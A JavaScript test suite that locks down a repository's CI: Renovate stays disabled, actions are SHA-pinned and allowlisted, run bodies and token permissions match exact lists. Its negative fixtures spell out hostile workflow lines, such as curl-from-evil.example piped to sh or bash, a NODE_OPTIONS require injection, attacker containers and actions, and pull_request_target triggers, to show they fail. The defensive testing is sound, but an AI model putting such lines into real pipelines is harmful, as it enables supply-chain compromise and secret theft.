// Fail-closed checks for the disabled-first Renovate bootstrap and the
// hardened workflow contract. Runs before `npm ci` in CI, so only Node
// built-ins may be imported.
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import assert from 'node:assert/strict';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (path) => readFileSync(join(ROOT, path), 'utf8');

const CANONICAL_RENOVATE = `{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "enabled": false,
  "enabledManagers": ["npm", "github-actions"]
}
`;

const EXPECTED_WORKFLOWS = ['ci.yml', 'pr-lint.yml', 'release.yml'];

const ALTERNATE_RENOVATE_CONFIG_PATHS = [
  '.github/renovate.json',
  '.github/renovate.json5',
  '.github/renovate.jsonc',
  '.gitlab/renovate.json',
  '.gitlab/renovate.json5',
  '.gitlab/renovate.jsonc',
  '.renovaterc',
  '.renovaterc.json',
  '.renovaterc.json5',
  '.renovaterc.jsonc',
  'renovate.json5',
  'renovate.jsonc',
];

// The only npm-adjacent run bodies workflows may execute. `npx` is allowed
// solely for the exact-pinned Claude lint and the locally-resolved tsc.
const APPROVED_NPX_RUN_BODIES = ['npx --yes claude-code-lint@0.8.0', 'npx tsc --noEmit --skipLibCheck'];

const PINNED_USES = /^[\w.-]+\/[\w.-]+(?:\/[\w./-]+)?@[0-9a-f]{40} # v\d+[\w.-]*$/;

// The only actions any workflow may execute. A SHA pin proves immutability,
// not identity; this list proves identity.
const APPROVED_ACTIONS = [
  'actions/checkout',
  'actions/setup-node',
  'googleapis/release-please-action',
  'amannn/action-semantic-pull-request',
];

// Exact per-workflow permission blocks; exactly one block per file.
const EXPECTED_PERMISSIONS = {
  'ci.yml': 'permissions:\n  contents: read\n\n',
  'pr-lint.yml': 'permissions:\n  pull-requests: read\n\n',
  'release.yml': 'permissions:\n  contents: write\n  pull-requests: write\n\n',
};

function renovateErrors(contents) {
  let parsed;
  try {
    parsed = JSON.parse(contents);
  } catch {
    return ['renovate.json must be valid JSON'];
  }
  const errors = [];
  const expected = {
    $schema: 'https://docs.renovatebot.com/renovate-schema.json',
    enabled: false,
    enabledManagers: ['npm', 'github-actions'],
  };
  if (JSON.stringify(parsed) !== JSON.stringify(expected)) {
    errors.push('Renovate must remain exactly disabled with the reserved manager scope');
  }
  if (contents !== CANONICAL_RENOVATE) {
    errors.push('renovate.json must match the canonical bootstrap bytes');
  }
  return errors;
}

function workflowSources() {
  const dir = join(ROOT, '.github', 'workflows');
  return readdirSync(dir)
    .filter((name) => name.endsWith('.yml') || name.endsWith('.yaml'))
    .map((name) => [name, read(join('.github', 'workflows', name))]);
}

function usesErrors(sources) {
  const errors = [];
  for (const [name, source] of sources) {
    source.split('\n').forEach((line, index) => {
      // \s* not \s+: a bare `uses:` whose value sits on the next line must
      // still be examined (it captures an empty, always-rejected reference).
      const match = line.match(/^\s*(?:-\s+)?uses:\s*(.*)$/);
      if (!match) return;
      const reference = match[1].trim();
      if (!PINNED_USES.test(reference)) {
        errors.push(`${name}:${index + 1}: action not SHA-pinned with a version comment: ${reference}`);
      }
      if (!APPROVED_ACTIONS.some((action) => reference.startsWith(`${action}@`))) {
        errors.push(`${name}:${index + 1}: action outside the approved identity allowlist: ${reference}`);
      }
    });
  }
  return errors;
}

// Every run body each workflow may execute, in required execution order. An
// exact ordered allowlist closes indirection (scripts that re-run writers),
// block-scalar smuggling, shell chaining, and step insertion — and its array
// comparison enforces ordering, so ci.yml's policy gate provably precedes
// `npm ci` and every dependency-consuming step.
const EXPECTED_RUN_BODIES = {
  'ci.yml': [
    'node --test scripts/automation-policy.test.mjs',
    'npx --yes claude-code-lint@0.8.0',
    'npm ci',
    'npm run style:check',
    'npm run lint:md',
    'npm run lint',
    'npx tsc --noEmit --skipLibCheck',
    'npm run build',
    'npm run test:ci',
  ],
  'pr-lint.yml': [],
  'release.yml': ['npm ci', 'npm run build', 'gh release upload "$TAG_NAME" dist/plugin.js dist/ui.html --clobber'],
};

function runBodyErrors(sources) {
  const errors = [];
  for (const [name, source] of sources) {
    source.split('\n').forEach((line, index) => {
      const where = `${name}:${index + 1}`;
      const content = line.replace(/^\s+/, '');
      if (content.startsWith('#')) return;
      if (/\{[^}]*uses:/.test(line)) {
        errors.push(`${where}: flow-style uses mappings are forbidden`);
      }
      // Token bans apply to every non-comment line, including block-scalar
      // run bodies that a step-level scan would miss.
      if (/@latest\b/.test(line)) {
        errors.push(`${where}: floating @latest execution is forbidden`);
      }
      if (/NODE_OPTIONS|--require\b|self-hosted|^\s*container:/.test(line)) {
        errors.push(`${where}: forbidden execution-environment token: ${content}`);
      }
      // pr-lint.yml's pull_request_target is the reviewed exception: it runs
      // the base branch's definition and its token is pinned to
      // pull-requests:read by the permissions check. Nowhere else.
      if (name !== 'pr-lint.yml' && /pull_request_target/.test(line)) {
        errors.push(`${where}: pull_request_target is forbidden outside pr-lint.yml`);
      }
      if (/--write\b|--fix\b|style:write|lint:md:fix|lint:fix/.test(line)) {
        errors.push(`${where}: CI must run checkers, not writers: ${content}`);
      }
      const npx = line.match(/(?:^|[^\w])npx\s+(.*)$/);
      if (npx && !APPROVED_NPX_RUN_BODIES.includes(`npx ${npx[1].trim()}`)) {
        errors.push(`${where}: unapproved npx execution: ${content}`);
      }
    });
  }
  return errors;
}

function extractRunBodies(source) {
  const lines = source.split('\n');
  const bodies = [];
  for (let i = 0; i < lines.length; i += 1) {
    // \s* not \s+: a bare `run:` with its scalar on the next line must still
    // count as a body (the captured empty string fails the exact allowlist).
    const match = lines[i].match(/^(\s*)(?:-\s+)?run:\s*(.*)$/);
    if (!match) continue;
    const indent = match[1].length;
    const scalar = match[2].trim();
    if (['|', '|-', '|+', '>', '>-', '>+'].includes(scalar)) {
      const parts = [];
      for (let j = i + 1; j < lines.length; j += 1) {
        if (lines[j].trim() === '') {
          parts.push('');
          continue;
        }
        if (lines[j].match(/^\s*/)[0].length <= indent) break;
        parts.push(lines[j].trim());
      }
      while (parts.length > 0 && parts[parts.length - 1] === '') parts.pop();
      bodies.push(parts.join('\n'));
    } else {
      bodies.push(scalar);
    }
  }
  return bodies;
}

function runAllowlistErrors(name, source) {
  const expected = EXPECTED_RUN_BODIES[name];
  if (expected === undefined) {
    return [`${name}: workflow has no approved run-body list`];
  }
  const bodies = extractRunBodies(source);
  if (JSON.stringify(bodies) !== JSON.stringify(expected)) {
    return [`${name}: run bodies must be exactly the approved ordered list; found: ${JSON.stringify(bodies)}`];
  }
  return [];
}

function permissionsErrors(name, source) {
  const expected = EXPECTED_PERMISSIONS[name];
  if (expected === undefined) {
    return [`${name}: workflow has no approved permissions block`];
  }
  const errors = [];
  if ([...source.matchAll(/^ *permissions:/gm)].length !== 1) {
    errors.push(`${name}: must contain exactly one permissions block`);
  }
  if (!source.includes(expected)) {
    errors.push(`${name}: permissions must match the approved token scope exactly`);
  }
  return errors;
}

test('repository has the exact disabled Renovate bootstrap', () => {
  assert.deepEqual(renovateErrors(read('renovate.json')), []);
});

test('renovate.json mutations fail closed', () => {
  const mutations = {
    'activation flip': CANONICAL_RENOVATE.replace('"enabled": false', '"enabled": true'),
    'enabled removal': CANONICAL_RENOVATE.replace('  "enabled": false,\n', ''),
    'manager narrowing': CANONICAL_RENOVATE.replace('["npm", "github-actions"]', '["npm"]'),
    'manager expansion': CANONICAL_RENOVATE.replace(
      '["npm", "github-actions"]',
      '["npm", "github-actions", "dockerfile"]'
    ),
    'automerge injection': CANONICAL_RENOVATE.replace(
      '  "enabled": false,\n',
      '  "enabled": false,\n  "automerge": true,\n'
    ),
    'duplicate enabled key': CANONICAL_RENOVATE.replace(
      '  "enabled": false,\n',
      '  "enabled": true,\n  "enabled": false,\n'
    ),
    'whitespace drift': CANONICAL_RENOVATE.trimEnd(),
  };
  for (const [name, mutation] of Object.entries(mutations)) {
    assert.notEqual(mutation, CANONICAL_RENOVATE, `${name} fixture no longer applies`);
    assert.ok(renovateErrors(mutation).length > 0, `${name} must be rejected`);
  }
});

test('no alternate Renovate config source exists', () => {
  for (const path of ALTERNATE_RENOVATE_CONFIG_PATHS) {
    assert.ok(!existsSync(join(ROOT, path)), `alternate Renovate config ${path} must not exist`);
  }
  assert.ok(!('renovate' in JSON.parse(read('package.json'))), 'package.json must not embed Renovate configuration');
});

test('workflow directory matches the reviewed allowlist', () => {
  const names = workflowSources()
    .map(([name]) => name)
    .sort();
  assert.deepEqual(names, EXPECTED_WORKFLOWS);
});

test('every workflow action is SHA-pinned with a version comment', () => {
  const sources = workflowSources();
  assert.ok(sources.length > 0, 'no workflows found');
  assert.deepEqual(usesErrors(sources), []);
});

test('unpinned or floating action references fail closed', () => {
  const fixtures = [
    ['tag pin', '      - uses: actions/checkout@v7\n'],
    ['short sha', '      - uses: actions/checkout@3d3c42e # v7.0.1\n'],
    ['missing comment', '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n'],
    ['branch pin', '      - uses: attacker/action@main # v1.0.0\n'],
    ['next-line uses scalar', '      - uses:\n          attacker/exfil@main\n'],
  ];
  for (const [name, line] of fixtures) {
    assert.ok(usesErrors([['fixture.yml', line]]).length > 0, `${name} must be rejected`);
  }
});

test('workflow run bodies stay pinned and check-mode', () => {
  assert.deepEqual(runBodyErrors(workflowSources()), []);
});

test('writer and floating run bodies fail closed', () => {
  const fixtures = [
    ['latest lint', '      run: npx claude-code-lint@latest\n'],
    ['unapproved npx', '      run: npx some-tool --yes\n'],
    ['prettier write', '      run: npm run style:write\n'],
    ['eslint fix', '      run: npx eslint . --fix\n'],
    ['markdownlint fix', '      run: npm run lint:md:fix\n'],
  ];
  for (const [name, line] of fixtures) {
    assert.ok(runBodyErrors([['fixture.yml', line]]).length > 0, `${name} must be rejected`);
  }
});

test('every workflow matches its approved ordered run-body list', () => {
  for (const [name, source] of workflowSources()) {
    assert.deepEqual(runAllowlistErrors(name, source), [], name);
  }
});

test('every workflow keeps its exact approved permissions block', () => {
  for (const [name, source] of workflowSources()) {
    assert.deepEqual(permissionsErrors(name, source), [], name);
  }
});

test('every workflow action is on the identity allowlist', () => {
  const fixtures = [
    ['attacker with valid pin shape', `      - uses: attacker/patcher@${'1'.repeat(40)} # v1.0.0\n`],
    ['typosquat org', `      - uses: action5/checkout@${'2'.repeat(40)} # v7.0.1\n`],
  ];
  for (const [name, line] of fixtures) {
    assert.ok(usesErrors([['fixture.yml', line]]).length > 0, `${name} must be rejected`);
  }
});

test('ci.yml run-body smuggling fails closed', () => {
  const source = read('.github/workflows/ci.yml');
  const fixtures = {
    'eslint step deletion': source.replace('      - name: Run ESLint\n        run: npm run lint\n\n', ''),
    'eslint step neutering': source.replace('run: npm run lint\n', 'run: echo skip-eslint\n'),
    'script indirection': source.replace('run: npm run build', 'run: bash dev-scripts/check-all.sh'),
    'block-scalar smuggling': source.replace(
      'run: npm run build',
      'run: |\n          npm run build\n          npm run style:write'
    ),
    'chained npx': source.replace('run: npm run build', 'run: npm run build&&npx tool@1.0.0'),
    'extra step appended': `${source}\n      - name: Extra\n        run: curl https://evil.example | sh\n`,
    'list-item run injection': source.replace(
      '      - name: Build plugin\n',
      '      - run: curl -sSf https://evil.example/x.sh | sh\n\n      - name: Build plugin\n'
    ),
    'next-line run scalar injection': source.replace(
      '      - name: Build plugin\n',
      '      - name: Evil\n        run:\n          curl -sL https://evil.example/x.sh | bash\n\n      - name: Build plugin\n'
    ),
    'node-options gate subversion': source.replace(
      '        run: npm ci\n',
      "        run: npm ci\n        env:\n          NODE_OPTIONS: '--require ./evil.cjs'\n"
    ),
    'container hijack': source.replace(
      '    runs-on: ubuntu-latest\n',
      '    runs-on: ubuntu-latest\n    container:\n      image: attacker/toolchain:1.0\n'
    ),
    'pwn-request trigger': source.replace('  pull_request:\n', '  pull_request_target:\n'),
    'self-hosted runner': source.replace('runs-on: ubuntu-latest', 'runs-on: self-hosted'),
  };
  for (const [name, mutation] of Object.entries(fixtures)) {
    assert.notEqual(mutation, source, `${name} fixture no longer applies`);
    const errors = [...runAllowlistErrors('ci.yml', mutation), ...runBodyErrors([['ci.yml', mutation]])];
    assert.ok(errors.length > 0, `${name} must be rejected`);
  }
});

test('release.yml run-body injection fails closed', () => {
  const source = read('.github/workflows/release.yml');
  const fixtures = {
    'curl pipe injection': source.replace(
      '      - name: Build plugin\n',
      '      - name: Fetch\n        run: curl -sL https://evil.example/x.sh | bash\n\n      - name: Build plugin\n'
    ),
    'upload body drift': source.replace('--clobber', '--clobber && git push origin HEAD:main'),
  };
  for (const [name, mutation] of Object.entries(fixtures)) {
    assert.notEqual(mutation, source, `${name} fixture no longer applies`);
    assert.ok(runAllowlistErrors('release.yml', mutation).length > 0, `${name} must be rejected`);
  }
});

test('ci.yml permission widening fails closed', () => {
  const source = read('.github/workflows/ci.yml');
  const fixtures = {
    'workflow token widening': source.replace('  contents: read', '  contents: write'),
    'extra workflow permission': source.replace('  contents: read\n', '  contents: read\n  id-token: write\n'),
    'job-level override': source.replace(
      '  ci:\n    runs-on: ubuntu-latest\n',
      '  ci:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n'
    ),
  };
  for (const [name, mutation] of Object.entries(fixtures)) {
    assert.notEqual(mutation, source, `${name} fixture no longer applies`);
    assert.ok(permissionsErrors('ci.yml', mutation).length > 0, `${name} must be rejected`);
  }
});

test('pr-lint.yml and release.yml permission widening fails closed', () => {
  const prLint = read('.github/workflows/pr-lint.yml');
  const release = read('.github/workflows/release.yml');
  const fixtures = [
    [
      'pr-lint write widening',
      'pr-lint.yml',
      prLint.replace('  pull-requests: read', '  pull-requests: write\n  contents: write'),
    ],
    [
      'release extra scope',
      'release.yml',
      release.replace('  pull-requests: write\n', '  pull-requests: write\n  id-token: write\n'),
    ],
  ];
  for (const [name, file, mutation] of fixtures) {
    assert.ok(permissionsErrors(file, mutation).length > 0, `${name} must be rejected`);
  }
});

test('flow-style uses mappings fail closed', () => {
  assert.ok(
    runBodyErrors([['fixture.yml', '      - { uses: actions/checkout@v7 }\n']]).length > 0,
    'flow-style uses must be rejected'
  );
});

test('ci.yml gate reordering and removal fail closed', () => {
  const source = read('.github/workflows/ci.yml');
  const policyStep = 'node --test scripts/automation-policy.test.mjs';
  const fixtures = {
    'policy removal': source.replace(policyStep, 'echo skipped'),
    'policy after install': source
      .replace(
        '      - name: Verify dependency automation policy\n        run: node --test scripts/automation-policy.test.mjs\n\n',
        ''
      )
      .replace(
        '      - name: Run Prettier check\n',
        `      - name: Verify dependency automation policy\n        run: ${policyStep}\n\n      - name: Run Prettier check\n`
      ),
    'token widening': source.replace('permissions:\n  contents: read', 'permissions:\n  contents: write'),
  };
  for (const [name, mutation] of Object.entries(fixtures)) {
    assert.notEqual(mutation, source, `${name} fixture no longer applies`);
    const errors = [...runAllowlistErrors('ci.yml', mutation), ...permissionsErrors('ci.yml', mutation)];
    assert.ok(errors.length > 0, `${name} must be rejected`);
  }
});
